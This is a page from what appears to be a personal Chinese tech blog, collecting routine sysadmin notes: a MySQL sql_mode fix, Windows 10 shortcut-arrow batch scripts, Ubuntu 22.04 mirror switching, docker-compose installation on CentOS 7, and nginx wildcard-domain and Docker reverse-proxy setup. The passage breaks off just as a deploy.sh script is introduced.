<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>历史归档 | 水木时</title><meta name="author" content="水木时"><meta name="copyright" content="水木时"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="2023-10-27MySQL报错：#1067 – Invalid default value for comment_date我记得以前使用这个命令是没有问题的，网上找了一翻，发现是mysql的问题了，以前我使用的mysql5.6，前不久刚升级到5.7，使用网上的方法竟然可行。 直接按网上教程修改mysql的配置文件my.cnf，编辑my.cnf 1vim &#x2F;etc&#x2F;my.cnf 在[mysql">
<meta property="og:type" content="article">
<meta property="og:title" content="历史归档">
<meta property="og:url" content="https://timefy.github.io/posts/c4046440.html">
<meta property="og:site_name" content="水木时">
<meta property="og:description" content="2023-10-27MySQL报错：#1067 – Invalid default value for comment_date我记得以前使用这个命令是没有问题的，网上找了一翻，发现是mysql的问题了，以前我使用的mysql5.6，前不久刚升级到5.7，使用网上的方法竟然可行。 直接按网上教程修改mysql的配置文件my.cnf，编辑my.cnf 1vim &#x2F;etc&#x2F;my.cnf 在[mysql">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://timefy.github.io/img/img/24.jpg">
<meta property="article:published_time" content="2024-07-05T08:04:17.000Z">
<meta property="article:modified_time" content="2024-07-05T09:18:28.337Z">
<meta property="article:author" content="水木时">
<meta property="article:tag" content="杂记">
<meta property="article:tag" content="历史归档">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://timefy.github.io/img/img/24.jpg"><link rel="shortcut icon" href="/img/inc.jpg"><link rel="canonical" href="https://timefy.github.io/posts/c4046440.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '历史归档',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-05 17:18:28'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/img.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/web%E5%AE%89%E5%85%A8"><i class="fa-fw fas fa-shield-alt"></i><span> Web安全</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE"><i class="fa-fw fas fa-cubes"></i><span> 区块链</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E9%98%85%E8%AF%BB"><i class="fa-fw fas fa-book"></i><span> 阅读</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="水木时"><span class="site-name">水木时</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/web%E5%AE%89%E5%85%A8"><i class="fa-fw fas fa-shield-alt"></i><span> Web安全</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE"><i class="fa-fw fas fa-cubes"></i><span> 区块链</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E9%98%85%E8%AF%BB"><i class="fa-fw fas fa-book"></i><span> 阅读</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">历史归档</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-05T08:04:17.000Z" title="发表于 2024-07-05 16:04:17">2024-07-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-05T09:18:28.337Z" title="更新于 2024-07-05 17:18:28">2024-07-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>32分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="历史归档"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="2023-10-27"><a href="#2023-10-27" class="headerlink" title="2023-10-27"></a>2023-10-27</h1><h2 id="MySQL报错：-1067-–-Invalid-default-value-for-comment-date"><a href="#MySQL报错：-1067-–-Invalid-default-value-for-comment-date" class="headerlink" title="MySQL报错：#1067 – Invalid default value for comment_date"></a>MySQL报错：#1067 – Invalid default value for comment_date</h2><p>我记得以前使用这个命令是没有问题的，网上找了一翻，发现是mysql的问题了，以前我使用的mysql5.6，前不久刚升级到5.7，使用网上的方法竟然可行。</p>
<p>直接按网上教程修改mysql的配置文件my.cnf，编辑my.cnf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br></pre></td></tr></table></figure>
<p>在[mysqld]下面添加如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql_mode=ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br></pre></td></tr></table></figure>
<p>保存后，重启mysql，再执行修改自增id的命令，一切正常了。</p>
<h1 id="2023-10-03"><a href="#2023-10-03" class="headerlink" title="2023-10-03"></a>2023-10-03</h1><h2 id="Win10完美去除桌面快捷图标小箭头"><a href="#Win10完美去除桌面快捷图标小箭头" class="headerlink" title="Win10完美去除桌面快捷图标小箭头"></a>Win10完美去除桌面快捷图标小箭头</h2><p>今天，给大家分享一个如何完美去除Win10桌面快捷图标小箭头的技巧，希望能够给大家带来帮助。</p>
<h3 id="去掉小箭头"><a href="#去掉小箭头" class="headerlink" title="去掉小箭头"></a>去掉小箭头</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons&quot; /v 29 /d &quot;%systemroot%\system32\imageres.dll,197&quot; /t reg_sz /f</span><br><span class="line">taskkill /f /im explorer.exe</span><br><span class="line">attrib -s-r-h&quot;%userprofile%\AppData\Local\iconcache.db&quot;</span><br><span class="line">del &quot;%userprofile%\AppData\Local\iconcache.db&quot; /f /q</span><br><span class="line">start explorer</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<p>复制上面的代码。新建一个文本文件。粘贴后另存为.bat文件，然后以<strong>管理员身份</strong>打开。</p>
<p>ok！</p>
<h3 id="恢复小箭头"><a href="#恢复小箭头" class="headerlink" title="恢复小箭头"></a>恢复小箭头</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reg delete &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons&quot; /v 29 /f</span><br><span class="line">taskkill /f /im explorer.exe</span><br><span class="line">attrib -s-r-h&quot;%userprofile%\AppData\Local\iconcache.db&quot;</span><br><span class="line">del &quot;%userprofile%\AppData\Local\iconcache.db&quot; /f /q</span><br><span class="line">start explorer</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<p>同理，将上述代码另存为.bat文件，<strong>管理员身份</strong>打开。就可恢复小箭头了。</p>
<p>这种方法不会导致任何问题可放心使用</p>
<blockquote>
<p>来源：<a target="_blank" rel="noopener" href="https://blog.51cto.com/binghe001/5246920">https://blog.51cto.com/binghe001/5246920</a></p>
</blockquote>
<h1 id="2023-08-22"><a href="#2023-08-22" class="headerlink" title="2023-08-22"></a>2023-08-22</h1><h2 id="ubuntu-22-04国内镜像源"><a href="#ubuntu-22-04国内镜像源" class="headerlink" title="ubuntu 22.04国内镜像源"></a>ubuntu 22.04国内镜像源</h2><p>Ubuntu 22.04 LTS这是一个长期支持版本，它将被支持五年，直到2027年4月。已发布的LTS版本带来了一些新的功能。</p>
<p>如果你正在使用Ubuntu 20.04 LTS，你会注意到许多视觉上的变化。</p>
<p>当然作为国内用户首要任务安装完成之后首要任务就是更改ubuntu 22.04的镜像/软件源。</p>
<p>国内有很多Ubuntu 22.04的镜像源，包括阿里、网易，还有很多教育网的镜像源，比如清华源、中科大源。</p>
<p>在教程中我们将介绍如何更改镜像在ubuntu 22.04。国内的包括有镜像阿里云/163源/清华大学/中科大。</p>
<p>首先我们需要先备份Ubuntu官方的软件源，执行以下命令将备份原来的软件源。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
<h3 id="清华大学镜像"><a href="#清华大学镜像" class="headerlink" title="清华大学镜像"></a>清华大学镜像</h3><p>清华大学开源软件镜像站，致力于为国内和校内用户提供高质量的开源软件镜像、Linux镜像源服务。</p>
<p>帮助用户更方便地获取开源软件。镜像站由清华大学TUNA协会负责运行维护。</p>
<p>复制以下命令即可一键切换到清华大学ubuntu 22.04镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;cat &lt;&lt; EOF &gt; /etc/apt/sources.list &amp;&amp; apt update </span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">EOF&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="163镜像"><a href="#163镜像" class="headerlink" title="163镜像"></a>163镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;cat &lt;&lt; EOF &gt; /etc/apt/sources.list &amp;&amp; apt update </span><br><span class="line">deb http://mirrors.163.com/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb http://mirrors.163.com/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.163.com/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.163.com/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.163.com/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.163.com/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="line">EOF&quot;</span><br></pre></td></tr></table></figure>
<h3 id="阿里云镜像"><a href="#阿里云镜像" class="headerlink" title="阿里云镜像"></a>阿里云镜像</h3><p>阿里巴巴开源镜像站，免费提供Linux镜像下载服务，拥有Ubuntu、CentOS、Deepin、MongoDB、Apache、Maven、Composer等多种开源软件镜像源。</p>
<p>此外还提供域名解析DNS、网络授时NTP等服务，致力于为互联网用户提供全面，高效和稳定的基础服务。</p>
<p>复制以下命令即可一键切换到阿里云 ubuntu 22.04镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;cat &lt;&lt; EOF &gt; /etc/apt/sources.list &amp;&amp; apt update </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="line">EOF&quot;</span><br></pre></td></tr></table></figure>
<h3 id="中科大镜像"><a href="#中科大镜像" class="headerlink" title="中科大镜像"></a>中科大镜像</h3><p>中国科学技术大学开源软件镜像由中国科学技术大学网络信息中心提供支持。</p>
<p>mirrors.ustc.edu.cn是Debian, Ubuntu, Fedora, Archlinux, CentOS等多个发行版的官方源。目前是中国大陆高校访问量最大，收录最全的开源软件镜像。</p>
<p>中国科学技术大学Linux用户协会是由中国科学技术大学在校的GNU/Linux爱好者发起并组成的一个全校性群众团体。</p>
<p>成立协会的目的在于联合科大的GNU/Linux使用者，搭建信息交流共享的平台，宣传自由软件的价值，提高自由软件社区文化氛围，推广自由软件在科大校园乃至合肥地区的应用。</p>
<p>复制以下命令即可一键切换到中科大ubuntu 22.04镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;cat &lt;&lt; EOF &gt; /etc/apt/sources.list &amp;&amp; apt update </span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="line">EOF&quot;</span><br></pre></td></tr></table></figure>
<h1 id="2023-08-15"><a href="#2023-08-15" class="headerlink" title="2023-08-15"></a>2023-08-15</h1><h2 id="解决CentOS-7出现docker-compose-command-not-found"><a href="#解决CentOS-7出现docker-compose-command-not-found" class="headerlink" title="解决CentOS 7出现docker-compose: command not found"></a>解决CentOS 7出现docker-compose: command not found</h2><h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h3><p>既然使用了docker-compose那自然得安装了。在GitHub上拉取过慢，建议在国内源DaoCloud中拉取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.29.2/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/soft/docker-compose</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中的/usr/local/soft/docker-compose为自己想要安装的docker-compose的路径，可自行修改</p>
</blockquote>
<h3 id="给Docker-Compose赋予权限"><a href="#给Docker-Compose赋予权限" class="headerlink" title="给Docker-Compose赋予权限"></a>给Docker-Compose赋予权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/local/soft/docker-compose</span><br></pre></td></tr></table></figure>
<blockquote>
<p>目录与上述一致</p>
</blockquote>
<h3 id="安装Docker-Compose插件"><a href="#安装Docker-Compose插件" class="headerlink" title="安装Docker-Compose插件"></a>安装Docker-Compose插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release</span><br><span class="line">yum install python3-pip</span><br><span class="line">pip3 install --upgrade pip</span><br><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>
<h3 id="修改指向"><a href="#修改指向" class="headerlink" title="修改指向"></a>修改指向</h3><p>凡是在之前修改了安装地址都需要修改指向<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/local/soft/docker-compose /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><br>让/usr/local/soft/docker-compose 指向 /usr/local/bin/docker-compose，以避免出现以下问题：</p>
<p><code>-bash: /usr/local/bin/docker-compose: No such file or directory</code></p>
<h3 id="确认版本"><a href="#确认版本" class="headerlink" title="确认版本"></a>确认版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
<h1 id="2023-08-14"><a href="#2023-08-14" class="headerlink" title="2023-08-14"></a>2023-08-14</h1><h2 id="linux-nginx服务器域名泛解析配置"><a href="#linux-nginx服务器域名泛解析配置" class="headerlink" title="linux nginx服务器域名泛解析配置"></a>linux nginx服务器域名泛解析配置</h2><p>要配置泛解析域名就需要先到网站所在的DNS服务商处设置A记录。</p>
<p>列如要解析www.liezi.net，请在主机记录(RR)处填写www</p>
<p>常见命名前缀包括：</p>
<p>www： 解析后域名为 www.liezi.net；</p>
<p>@ 或 空值（不填写）： 直接解析域名，使主机记录为空，解析后的域名为 liezi.net；</p>
<p>Mail： 通常被用作邮箱服务器前缀，解析后的域名为 mail.liezi.net；</p>
<p>* ： 表示泛解析，所有子域名均被解析到同一地址（除单独设置的子域名解析）。 这里我要将所有的前缀都指向到我的IP所在服务器</p>
<p>下面以本站为例 设置记录类型 A，主机记录 *，记录值IP。</p>
<p>设置好后还需要在服务器中的 www.liezi.net的配置中 设置 更改 server_name www.liezi.net 为 server_name *.liezi.net</p>
<p>另外如果需要将liezi.net也解析为 www.liezi.net需要再建一个 虚拟主机配置文件 并将里面设置为server_name liezi.net； 重新加载后即可，效果就如本小站效果一样了。 如果有更好的方法欢迎指教。</p>
<h2 id="使用nginx-docker实现多域名单服务器去端口访问"><a href="#使用nginx-docker实现多域名单服务器去端口访问" class="headerlink" title="使用nginx+docker实现多域名单服务器去端口访问"></a>使用nginx+docker实现多域名单服务器去端口访问</h2><h3 id="源起"><a href="#源起" class="headerlink" title="源起"></a>源起</h3><p>这个问题的产生源于一个十分基础的需求——在一个服务器上部署多个网页。特别的，此处指以 Docker 部署的网页。</p>
<p>一般来说，想要访问某一个服务器上不同的网络服务只需要在宿主机上开启不同的网络端口同时使用端口映射将容器的80端口映射至其上即可，例如分别运行 docker run -p 8080:80 container1 和 docker run -p 8081:80 container2 即可通过 <8080>和<8081>访问到不同的服务，但是这样十分不优雅，在实际生活过程中，应该很难见到需要用户手动输入端口号的网页。所以我们不得不考虑，如何去除端口号。</p>
<h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><p>答案是反向代理，通过nginx来监听80端口，同时记录访问的域名来将请求代理至具体的容器。尽管我依照教程(如这篇文章Deploying multi-domain applications in a single host with Docker and Nginx (reiland.dev))来操作，但都无法成功。（大部分教程的代码都是一样的，国内尤其如此）</p>
<p>通过排查最终确定，失败的原因是，这些教程中的nginx都是直接安装在宿主机上的，而我希望的实现方式是在docker中直接使用nginx的容器。在意识到问题的基础上，通过合适的配置，最终实现的希望的效果。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>先看看最终的实现方式 如下是示例项目的结构，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">demo1</span><br><span class="line">├── dist</span><br><span class="line">│   ├── assets</span><br><span class="line">│   │   ├── index.4e29489a.js</span><br><span class="line">│   │   └── index.e3b0c442.css</span><br><span class="line">│   ├── favicon.ico</span><br><span class="line">│   ├── index.html</span><br><span class="line">│   └── README.md</span><br><span class="line">|</span><br><span class="line">demo1</span><br><span class="line">├── dist</span><br><span class="line">│   ├── assets</span><br><span class="line">│   │   ├── index.4e29489a.js</span><br><span class="line">│   │   └── index.e3b0c442.css</span><br><span class="line">│   ├── favicon.ico</span><br><span class="line">│   ├── index.html</span><br><span class="line">│   └── README.md</span><br><span class="line">|</span><br><span class="line">proxy</span><br><span class="line">├── nginx</span><br><span class="line">│   └── default.conf</span><br><span class="line">|</span><br><span class="line">deploy.sh</span><br></pre></td></tr></table></figure>
<p>其中deploy.sh内容如下(将几个命令保存为shell脚本，便于修改)</p>
